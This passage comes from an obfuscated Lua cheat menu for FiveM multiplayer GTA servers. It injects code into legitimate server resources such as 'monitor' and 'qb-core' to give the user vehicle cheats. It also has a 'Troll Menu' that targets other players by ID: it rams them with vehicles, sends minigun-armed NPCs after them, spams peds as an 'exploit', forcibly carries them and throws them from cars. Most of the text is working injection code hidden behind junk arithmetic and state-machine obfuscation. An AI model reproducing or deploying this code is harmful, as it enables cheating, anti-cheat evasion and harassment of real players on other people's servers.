            if DoesEntityExist(vehicle) then
                -- Set vehicle properties
                SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                SetVehicleEngineOn(vehicle, true, true, false)
                SetVehicleDoorsLocked(vehicle, 1)
                
                -- Give keys to player
                local plate = GetVehicleNumberPlateText(vehicle)
                TriggerEvent('vehiclekeys:client:SetOwner', plate)
                
                -- Put player in vehicle
                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                
                print("Vehicle spawned: " .. modelName .. " with keys")
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Spawned ' .. modelName .. ' with keys!' } })
            end
            
            SetModelAsNoLongerNeeded(modelHash)
        end
    ]]);MachoMenuNotification("Vehicle","Spawning random car with keys...");end);local v79=MachoMenuInputbox(v71,"Vehicle Model","e.g., sultan");MachoMenuButton(v71,"Spawn Specific Car with Keys",function() local v283=MachoMenuGetInputbox(v79);if (v283 and (v283~="")) then local v523=0;local v524;while true do if (v523==(1 + 0)) then MachoInjectResource2(NewThreadNs,v524,string.format([[
            local modelName = "%s"
            local modelHash = GetHashKey(modelName)
            
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Citizen.Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local playerPed = PlayerPedId()
                local coords = GetEntityCoords(playerPed)
                local heading = GetEntityHeading(playerPed)
                
                local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, heading, true, false)
                
                if DoesEntityExist(vehicle) then
                    SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                    SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                    SetVehicleEngineOn(vehicle, true, true, false)
                    SetVehicleDoorsLocked(vehicle, 1)
                    
                    -- Give keys to player
                    local plate = GetVehicleNumberPlateText(vehicle)
                    TriggerEvent('vehiclekeys:client:SetOwner', plate)
                    
                    -- Put player in vehicle
                    TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                    
                    print("Vehicle spawned: " .. modelName .. " with keys")
                    TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Spawned ' .. modelName .. ' with keys!' } })
                end
                
                SetModelAsNoLongerNeeded(modelHash)
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'Invalid model: ' .. modelName } })
            end
        ]],v283));MachoMenuNotification("Vehicle","Spawning "   .. v283   .. " with keys..." );break;end if (v523==(0 + 0)) then v524=nil;if (GetResourceState("monitor")=="started") then v524="monitor";elseif (GetResourceState("qb-core")=="started") then v524="qb-core";else v524="ox_inventory";end v523=270 -(239 + 30) ;end end else MachoMenuNotification("Error","Please enter a vehicle model!");end end);MachoMenuButton(v71,"Spawn Car with Keys (Simple)",function() local v284=PlayerPedId();local v285=GetEntityCoords(v284);local v286=GetHashKey("sultan");RequestModel(v286);while  not HasModelLoaded(v286) do Citizen.Wait(0);end local v287=CreateVehicle(v286,v285.x,v285.y,v285.z,GetEntityHeading(v284),true,false);if DoesEntityExist(v287) then SetVehicleCustomPrimaryColour(v287,255,70 + 185 ,255);SetVehicleCustomSecondaryColour(v287,246 + 9 ,450 -195 ,795 -540 );SetVehicleEngineOn(v287,true,true,false);SetVehicleDoorsLocked(v287,316 -(306 + 9) );local v525=GetVehicleNumberPlateText(v287);TriggerEvent("vehiclekeys:client:SetOwner",v525);TaskWarpPedIntoVehicle(v284,v287, -(3 -2));MachoMenuNotification("Vehicle","Spawned Sultan with keys!");end SetModelAsNoLongerNeeded(v286);end);local v80=MachoMenuInputbox(v71,"License Plate","e.g., 34AKP952");MachoMenuButton(v71,"Set License Plate",function() local v288=0 + 0 ;local v289;while true do if ((0 + 0)==v288) then v289=MachoMenuGetInputbox(v80);if (v289 and (v289~="")) then local v793=0 + 0 ;while true do if (v793==0) then MachoInjectResource2(NewThreadNs,"monitor",string.format([[
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsIn(ped, false)
            if veh and veh ~= 0 then
                SetVehicleNumberPlateText(veh, "%s")
                print("License plate set to: " .. "%s")
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'License plate set to: %s' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
            end
        ]],v289,v289,v289));MachoMenuNotification("Vehicle","License plate set to: "   .. v289 );break;end end else MachoMenuNotification("Error","Please enter a plate number!");end break;end end end);MachoMenuButton(v71,"Repair Vehicle",function() local v290=0 -0 ;while true do if (v290==(1375 -(1140 + 235))) then MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local vehicle = GetVehiclePedIsIn(ped, false)
        
        if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
            SetVehicleFixed(vehicle)
            SetVehicleDeformationFixed(vehicle)
            SetVehicleUndriveable(vehicle, false)
            SetVehicleEngineOn(vehicle, true, true, true)
            SetVehicleEngineHealth(vehicle, 1000.0)
            SetVehicleBodyHealth(vehicle, 1000.0)
            SetVehiclePetrolTankHealth(vehicle, 1000.0)
            SetVehicleFuelLevel(vehicle, 100.0)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle repaired!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Vehicle repaired!");break;end end end);MachoMenuButton(v71,"Clean Vehicle",function() local v291=0 + 0 ;while true do if (v291==(0 + 0)) then MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 then
            SetVehicleDirtLevel(veh, 0.0)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle cleaned!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Vehicle cleaned!");break;end end end);MachoMenuButton(v71,"Force Engine",function() MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 then
            SetVehicleEngineOn(veh, true, true, true)
            SetVehicleUndriveable(veh, false)
            SetVehicleNeedsToBeHotwired(veh, false)
            SetVehicleKeepEngineOnWhenAbandoned(veh, true)
            SetVehicleEngineCanDegrade(veh, false)
            SetVehicleEngineHealth(veh, 900.0)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Engine forced on!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Engine forced on!");end);MachoMenuButton(v71,"Max Upgrade",function() local v292=0 + 0 ;while true do if (0==v292) then MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleModKit(veh, 0)
            SetVehicleWheelType(veh, 7)
            
            -- All mods
            for modType = 0, 16 do
                local maxMod = GetNumVehicleMods(veh, modType)
                if maxMod and maxMod > 0 then
                    SetVehicleMod(veh, modType, maxMod - 1, false)
                end
            end
            
            -- Turbo
            SetVehicleMod(veh, 14, 16, false)
            
            -- Spoiler
            local spoilerMax = GetNumVehicleMods(veh, 15)
            if spoilerMax and spoilerMax > 1 then
                SetVehicleMod(veh, 15, spoilerMax - 2, false)
            end
            
            -- Toggle mods
            for modType = 17, 22 do
                ToggleVehicleMod(veh, modType, true)
            end
            
            -- Window tint
            SetVehicleWindowTint(veh, 1)
            
            -- Tyres
            SetVehicleTyresCanBurst(veh, false)
            
            -- Remove extras
            for extra = 1, 12 do
                if DoesExtraExist(veh, extra) then
                    SetVehicleExtra(veh, extra, false)
                end
            end
            
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle max upgraded!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Vehicle max upgraded!");break;end end end);MachoMenuButton(v71,"Delete Vehicle",function() MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleHasBeenOwnedByPlayer(veh, true)
            SetEntityAsMissionEntity(veh, true, true)
            
            if NetworkHasControlOfEntity(veh) then
                DeleteEntity(veh)
                DeleteVehicle(veh)
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle deleted!' } })
            else
                NetworkRequestControlOfEntity(veh)
                Wait(100)
                DeleteEntity(veh)
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Vehicle deleted!' } })
            end
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Deleting vehicle...");end);MachoMenuButton(v71,"Unlock Closest Vehicle",function() local v293=52 -(33 + 19) ;while true do if (v293==(0 + 0)) then MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) and NetworkHasControlOfEntity(veh) then
            SetEntityAsMissionEntity(veh, true, true)
            SetVehicleHasBeenOwnedByPlayer(veh, true)
            SetVehicleDoorsLocked(veh, 1)
            SetVehicleDoorsLockedForAllPlayers(veh, false)
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Closest vehicle unlocked!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'No vehicle found nearby!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Unlocking closest vehicle...");break;end end end);MachoMenuButton(v71,"TP into Closest Vehicle",function() MachoInjectResource2(NewThreadNs,"monitor",[[
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 15.0, 0, 70)
        
        if veh and veh ~= 0 and DoesEntityExist(veh) and not IsPedInAnyVehicle(ped, false) then
            if GetPedInVehicleSeat(veh, -1) == 0 then
                TaskWarpPedIntoVehicle(ped, veh, -1)
            else
                TaskWarpPedIntoVehicle(ped, veh, 0)
            end
            TriggerEvent('chat:addMessage', { args = { '^2Vehicle:', 'Teleported into closest vehicle!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'No vehicle found nearby or you are already in a vehicle!' } })
        end
    ]]);MachoMenuNotification("Vehicle","Teleporting into closest vehicle...");end);local v81=false;MachoMenuCheckbox(v71,"Boost Vehicle",function() local v294=0 -0 ;while true do if (v294==(0 + 0)) then v81=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.boostThreadRunning then
            _G.boostThreadRunning = true
            _G.boostEnabled = true
            
            CreateThread(function()
                while _G.boostThreadRunning do
                    Wait(0)
                    if not _G.boostEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    if IsControlPressed(0, 209) and IsPedInAnyVehicle(ped, false) then -- Shift
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 then
                            SetVehicleForwardSpeed(veh, 100.0)
                        end
                    end
                    ::continue::
                end
            end)
        end
        _G.boostEnabled = true
    ]]);v294=1 -0 ;end if (v294==(1 + 0)) then MachoMenuNotification("Boost","Boost Vehicle ON (Hold Shift)");break;end end end,function() local v295=689 -(586 + 103) ;while true do if (v295==0) then v81=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        _G.boostEnabled = false
        _G.boostThreadRunning = false
    ]]);v295=1 + 0 ;end if (v295==(2 -1)) then MachoMenuNotification("Boost","Boost Vehicle OFF");break;end end end);local v82=false;MachoMenuCheckbox(v71,"Instant Brakes",function() local v296=1488 -(1309 + 179) ;while true do if (v296==(1 -0)) then MachoMenuNotification("Brakes","Instant Brakes ON (Hold S)");break;end if (v296==(0 + 0)) then v82=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.brakesThreadRunning then
            _G.brakesThreadRunning = true
            _G.brakesEnabled = true
            
            CreateThread(function()
                while _G.brakesThreadRunning do
                    Wait(0)
                    if not _G.brakesEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    local veh = GetVehiclePedIsIn(ped, false)
                    if veh and veh ~= 0 and IsDisabledControlPressed(0, 33) and IsPedInAnyVehicle(ped, false) then -- S
                        SetVehicleForwardSpeed(veh, 0.0)
                    end
                    ::continue::
                end
            end)
        end
        _G.brakesEnabled = true
    ]]);v296=2 -1 ;end end end,function() local v297=0;while true do if (v297==(1 + 0)) then MachoMenuNotification("Brakes","Instant Brakes OFF");break;end if ((0 -0)==v297) then v82=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        _G.brakesEnabled = false
        _G.brakesThreadRunning = false
    ]]);v297=1 -0 ;end end end);local v83=false;MachoMenuCheckbox(v71,"Easy Handling",function() local v298=609 -(295 + 314) ;while true do if (v298==(0 -0)) then v83=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.handlingThreadRunning then
            _G.handlingThreadRunning = true
            _G.handlingEnabled = true
            
            CreateThread(function()
                while _G.handlingThreadRunning do
                    Wait(0)
                    if not _G.handlingEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    local veh = GetVehiclePedIsIn(ped, false)
                    if veh and veh ~= 0 and DoesEntityExist(veh) then
                        SetVehicleGravityAmount(veh, 73.0)
                        SetVehicleStrong(veh, true)
                    end
                    ::continue::
                end
            end)
        end
        _G.handlingEnabled = true
    ]]);v298=1963 -(1300 + 662) ;end if ((3 -2)==v298) then MachoMenuNotification("Handling","Easy Handling ON");break;end end end,function() local v299=1755 -(1178 + 577) ;while true do if (v299==(0 + 0)) then v83=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        _G.handlingEnabled = false
        _G.handlingThreadRunning = false
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleGravityAmount(veh, 9.8)
            SetVehicleStrong(veh, false)
        end
    ]]);v299=2 -1 ;end if (v299==(1406 -(851 + 554))) then MachoMenuNotification("Handling","Easy Handling OFF");break;end end end);local v84=false;MachoMenuCheckbox(v71,"Rainbow Vehicle",function() local v300=0 + 0 ;while true do if (v300==(2 -1)) then MachoMenuNotification("Rainbow","Rainbow Vehicle ON");break;end if ((0 -0)==v300) then v84=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.rainbowThreadRunning then
            _G.rainbowThreadRunning = true
            _G.rainbowEnabled = true
            
            CreateThread(function()
                local freq = 1.0
                while _G.rainbowThreadRunning do
                    Wait(0)
                    if not _G.rainbowEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    local veh = GetVehiclePedIsIn(ped, false)
                    if veh and veh ~= 0 and DoesEntityExist(veh) then
                        local t = GetGameTimer() / 1000
                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                        SetVehicleCustomPrimaryColour(veh, r, g, b)
                        SetVehicleCustomSecondaryColour(veh, r, g, b)
                    end
                    ::continue::
                end
            end)
        end
        _G.rainbowEnabled = true
    ]]);v300=303 -(115 + 187) ;end end end,function() local v301=0 + 0 ;while true do if (v301==(1 + 0)) then MachoMenuNotification("Rainbow","Rainbow Vehicle OFF");break;end if (v301==0) then v84=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        _G.rainbowEnabled = false
        _G.rainbowThreadRunning = false
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 and DoesEntityExist(veh) then
            SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
            SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
        end
    ]]);v301=3 -2 ;end end end);local v85=false;MachoMenuCheckbox(v71,"Unlimited Fuel",function() v85=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.fuelThreadRunning then
            _G.fuelThreadRunning = true
            _G.fuelEnabled = true
            
            CreateThread(function()
                while _G.fuelThreadRunning do
                    Wait(100)
                    if not _G.fuelEnabled then
                        Wait(500)
                        goto continue
                    end
                    
                    local ped = PlayerPedId()
                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                            SetVehicleFuelLevel(veh, 100.0)
                        end
                    end
                    ::continue::
                end
            end)
        end
        _G.fuelEnabled = true
    ]]);MachoMenuNotification("Fuel","Unlimited Fuel ON");end,function() v85=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        _G.fuelEnabled = false
        _G.fuelThreadRunning = false
    ]]);MachoMenuNotification("Fuel","Unlimited Fuel OFF");end);local v86=MachoMenuAddTab(v4,"Troll Menu");local v87=MachoMenuGroup(v86,"Vehicle and NPC Features",1581 -(160 + 1001) ,9,622 + 88 ,v1.y-(7 + 3) );local v88=MachoMenuGroup(v86,"Player Manipulation",317 -162 ,9,778 -(237 + 121) ,v1.y-(907 -(525 + 372)) );MachoMenuText(v87,"Vehicle Ram");local v89=MachoMenuInputbox(v87,"Target Player ID (Vehicle Ram)","e.g., 123");MachoMenuButton(v87,"Launch Vehicle at Player",function() local v302=0;local v303;while true do if (v302==(0 -0)) then v303=tonumber(MachoMenuGetInputbox(v89));if (v303 and (v303>0)) then MachoInjectResource("monitor",string.format([[
            local playerId = GetPlayerFromServerId(%d)
            if playerId then
                local targetPed = GetPlayerPed(playerId)
                local targetCoords = GetEntityCoords(targetPed)
                local offset = GetOffsetFromEntityInWorldCoords(targetPed, 0, -2.0, 0)
                local vehModel = "sultan"
                RequestModel(vehModel)
                while not HasModelLoaded(vehModel) do
                    Citizen.Wait(0)
                end
                local vehicle = CreateVehicle(vehModel, offset.x, offset.y, offset.z, GetEntityHeading(targetPed), true, true)
                SetEntityVisible(vehicle, true, true)
                if DoesEntityExist(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    SetVehicleDoorsLocked(vehicle, 4)
                    SetVehicleForwardSpeed(vehicle, 80.0)
                end
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle launched! Target ID: %d' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Player not found! ID: %d' } })
            end
        ]],v303,v303,v303));MachoMenuNotification("Vehicle System","Vehicle launch initiated! Target ID: "   .. v303 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);MachoMenuText(v87,"NPC Attack");local v90=MachoMenuInputbox(v87,"Target Player ID (NPC)","e.g., 123");MachoMenuButton(v87,"Start NPCs",function() local v304=tonumber(MachoMenuGetInputbox(v90));if (v304 and (v304>(0 -0))) then if isSpawning then local v755=0;while true do if (v755==(142 -(96 + 46))) then MachoMenuNotification("Error","NPCs are already spawning! Stop them first.");return;end end end isSpawning=true;MachoMenuNotification("NPC System","NPC spawn initiated! Target ID: "   .. v304 );Citizen.CreateThread(function() while isSpawning do local v756=777 -(643 + 134) ;while true do if (v756==(0 + 0)) then MachoInjectResource("monitor",string.format([[
                    local npcModel = "a_m_m_acult_01"
                    local weaponHash = "weapon_rayminigun"
                    local radius = 5.0
                    local numberOfPeds = 5
                    local playerPed = GetPlayerPed(GetPlayerFromServerId(%d))
                    if not DoesEntityExist(playerPed) then
                        TriggerEvent('chat:addMessage', { args = { '^1NPC System:', 'Target player not found!' } })
                        return
                    end
                    local playerPos = GetEntityCoords(playerPed)
                    RequestModel(npcModel)
                    while not HasModelLoaded(npcModel) do
                        Citizen.Wait(100)
                    end
                    for i = 0, numberOfPeds - 1 do
                        local angle = (i / numberOfPeds) * (2 * math.pi)
                        local spawnX = playerPos.x + radius * math.cos(angle)
                        local spawnY = playerPos.y + radius * math.sin(angle)
                        local spawnZ = playerPos.z
                        local npc = CreatePed(4, npcModel, spawnX, spawnY, spawnZ, 0.0, true, false)
                        GiveWeaponToPed(npc, GetHashKey(weaponHash), 250, false, true)
                        SetPedCombatAttributes(npc, 5, true)
                        SetPedCombatRange(npc, 2)
                        SetPedCombatMovement(npc, 3)
                        TaskCombatPed(npc, playerPed, 0, 16)
                        SetEntityAsNoLongerNeeded(npc)
                    end
                ]],v304,v304));Wait(2000);break;end end end end);else MachoMenuNotification("Error","Please enter a valid player ID!");end end);MachoMenuButton(v87,"Stop NPCs",function() if isSpawning then isSpawning=false;MachoMenuNotification("NPC System","NPC spawn stopped!");else MachoMenuNotification("Info","NPC spawn is already stopped.");end end);MachoMenuText(v87,"NPC Spam");local v91=false;local v92="mp_m_freemode_01";local v93=MachoMenuInputbox(v87,"NPC Spam Target ID","e.g., 123");MachoMenuButton(v87,"Start Ped Spam - Exploit",function() local v305=0;local v306;while true do if (v305==(4 -2)) then MachoInjectResource("monitor",string.format([[
        local pedModel = "%s"
        local pedSpawning = true
        local targetId = %d

        CreateThread(function()
            while pedSpawning do
                RequestModel(pedModel)
                while not HasModelLoaded(pedModel) do
                    Wait(100)
                end

                local player = GetPlayerFromServerId(targetId)
                if player and player ~= -1 then
                    local ped = GetPlayerPed(player)
                    local pos = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)

                    local spawnedPed = CreatePed(28, GetHashKey(pedModel), pos.x, pos.y, pos.z, heading, true, false)
                    TaskWanderInArea(spawnedPed, pos.x, pos.y, pos.z, 10.0, 10.0, 10.0)
                    SetPedAsNoLongerNeeded(spawnedPed)
                end

                Wait(math.random(1000, 2000))
            end
        end)

        RegisterNetEvent("stopPedSpamExploit", function()
            pedSpawning = false
        end)
    ]],v92,v306));MachoMenuNotification("NPC System","Ped spam started! Target ID: "   .. v306 );break;end if (v305==(0 -0)) then if v91 then local v794=0 + 0 ;while true do if (v794==(0 -0)) then MachoMenuNotification("Error","Already started. Stop it first.");return;end end end v306=tonumber(MachoMenuGetInputbox(v93));v305=1 -0 ;end if (v305==(720 -(316 + 403))) then if ( not v306 or (v306<=0)) then local v795=0 + 0 ;while true do if ((0 -0)==v795) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v91=true;v305=1 + 1 ;end end end);MachoMenuButton(v87,"Stop Ped Spam",function() if  not v91 then local v526=0 -0 ;while true do if (v526==0) then MachoMenuNotification("Info","Already stopped.");return;end end end v91=false;MachoInjectResource("monitor",[[
        TriggerEvent("stopPedSpamExploit")
    ]]);MachoMenuNotification("NPC System","Ped spam stopped!");end);MachoMenuText(v88,"Player Manipulation");local v94=MachoMenuInputbox(v88,"Bring Target Player ID","e.g., 123");MachoMenuButton(v88,"Bring to Self",function() local v307=0;local v308;while true do if (v307==(0 + 0)) then v308=tonumber(MachoMenuGetInputbox(v94));if (v308 and (v308>(0 + 0))) then MachoInjectResource("monitor",string.format([[
            local playerPed = PlayerPedId()
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if targetPlayer then
                local targetPed = GetPlayerPed(targetPlayer)
                if targetPed and targetPed ~= 0 then
                    local targetCoords = GetEntityCoords(targetPed)
                    local originalPos = GetEntityCoords(playerPed)
                    
                    -- Teleport to target
                    SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    
                    -- Wait a moment
                    Citizen.Wait(150)
                    
                    -- Trigger carry on target (this makes you carry them)
                    TriggerEvent('m3-smallresources:CarryHideInTrunk:carryPlayer')
                    
                    -- Wait for carry to start
                    Citizen.Wait(500)
                    
                    -- Teleport back to original position (player being carried will follow)
                    SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, true)
                    
                    TriggerEvent('chat:addMessage', { args = { '^2Bring Exploit:', 'Brought player ID: ' .. targetServerId .. ' back with you!' } })
                else
                    TriggerEvent('chat:addMessage', { args = { '^1Bring Exploit:', 'Target player not in game! ID: ' .. targetServerId } })
                end
            else
                TriggerEvent('chat:addMessage', { args = { '^1Bring Exploit:', 'Player not found! ID: ' .. targetServerId } })
            end
        ]],v308));MachoMenuNotification("Bring Exploit","Bring process started! Target ID: "   .. v308 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v95=MachoMenuInputbox(v88,"Target Player ID (Launch)","e.g., 123");MachoMenuButton(v88,"Launch Player",function() local v309=tonumber(MachoMenuGetInputbox(v95));if (v309 and (v309>(0 -0))) then local v527=0 -0 ;local v528;while true do if (v527==1) then if (GetResourceState("monitor")=="started") then v528="monitor";elseif (GetResourceState("qb-core")=="started") then v528="qb-core";else v528="ox_inventory";end MachoInjectResource2(NewThreadNs,v528,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Launch: Player not found!")
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Launch: Target ped not found!")
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Launch: Cannot target self!")
                return
            end
            
            local myPed = PlayerPedId()
            local myCoords = GetEntityCoords(myPed)
            local targetCoords = GetEntityCoords(targetPed)
            local distance = #(myCoords - targetCoords)
            
            local teleported = false
            local originalCoords = myCoords
            
            -- Teleport to target if far away
            if distance > 10.0 then
                local angle = math.random() * 2 * math.pi
                local radiusOffset = math.random(5, 9)
                local xOffset = math.cos(angle) * radiusOffset
                local yOffset = math.sin(angle) * radiusOffset
                local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                SetEntityVisible(myPed, false, 0)
                teleported = true
                Wait(100)
            end
            
            -- Launch effect
            ClearPedTasksImmediately(myPed)
            for i = 1, 15 do
                if not DoesEntityExist(targetPed) then break end
                local curTargetCoords = GetEntityCoords(targetPed)
                if not curTargetCoords then break end
                
                SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                Wait(50)
                AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                Wait(50)
                DetachEntity(myPed, true, true)
                Wait(100)
            end
            
            Wait(500)
            ClearPedTasksImmediately(myPed)
            
            -- Return to original position
            if originalCoords then
                SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
                Wait(100)
                SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
            end
            
            if teleported then
                SetEntityVisible(myPed, true, 0)
            end
            
            local targetName = GetPlayerName(targetPlayer)
            print("Launch: Launched " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2Launch:', 'Launched ' .. targetName .. ' (ID: %d)' } })
        ]],v309,v309));break;end if (v527==0) then MachoMenuNotification("Launch","Launching player ID: "   .. v309 );v528=nil;v527=1 -0 ;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v96=MachoMenuInputbox(v88,"Target Player ID (Kick Vehicle)","e.g., 123");MachoMenuButton(v88,"Kick From Vehicle",function() local v310=0;local v311;while true do if (v310==(0 + 0)) then v311=tonumber(MachoMenuGetInputbox(v96));if (v311 and (v311>(0 -0))) then local v796=0;local v797;while true do if (v796==(0 + 0)) then MachoMenuNotification("Kick Vehicle","Kicking player ID: "   .. v311 );v797=nil;v796=2 -1 ;end if (v796==(18 -(12 + 5))) then if (GetResourceState("monitor")=="started") then v797="monitor";elseif (GetResourceState("qb-core")=="started") then v797="qb-core";else v797="ox_inventory";end MachoInjectResource2(NewThreadNs,v797,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Kick Vehicle: Player not found!")
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Kick Vehicle: Target ped not found!")
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Kick Vehicle: Cannot target self!")
                return
            end
            
            if not IsPedInAnyVehicle(targetPed, false) then
                print("Kick Vehicle: Player is not in a vehicle!")
                TriggerEvent('chat:addMessage', { args = { '^1Kick Vehicle:', 'Player is not in a vehicle!' } })
                return
            end
            
            local vehicle = GetVehiclePedIsIn(targetPed, false)
            local driverPed = GetPedInVehicleSeat(vehicle, -1)
            
            if driverPed ~= 0 then
                ClearPedTasksImmediately(driverPed)
                TaskLeaveVehicle(driverPed, vehicle, 0)
                SetPedToRagdoll(driverPed, 1000, 1000, 0, true, true, false)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Kick Vehicle: Kicked " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Kick Vehicle:', 'Kicked ' .. targetName .. ' from vehicle!' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1Kick Vehicle:', 'No driver found!' } })
            end
